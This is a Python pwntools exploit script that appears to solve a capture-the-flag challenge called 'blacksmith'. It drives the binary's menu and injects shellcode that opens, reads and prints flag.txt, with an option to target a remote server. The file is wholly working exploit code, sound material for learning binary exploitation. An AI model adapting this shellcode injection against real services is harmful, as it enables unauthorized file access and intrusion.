from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>', '1')  # Yes, I brought them
    p.sendlineafter('>', '2')  # Craft a shield
    p.sendlineafter('>', payload)  # Pwn
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break main
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './blacksmith'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# No offset to find, binary is NOT vulnerable to BoF - won't generate core dump
# offset = find_ip(cyclic(100))

# Start program
io = start()

# Shellcode to open flag.txt, read from it and then write to stdout
shellcode = asm(shellcraft.open('flag.txt'))
shellcode += asm(shellcraft.read(3, 'rsp', 0x100))
shellcode += asm(shellcraft.write(1, 'rsp', 'rax'))

# Send payload
io.sendlineafter('>', '1')  # Yes, I brought them
io.sendlineafter('>', '2')  # Craft a shield
io.sendlineafter('>', flat(shellcode))  # Pwn
io.recv()

# Get our flag!
flag = io.recv()
success(flag)
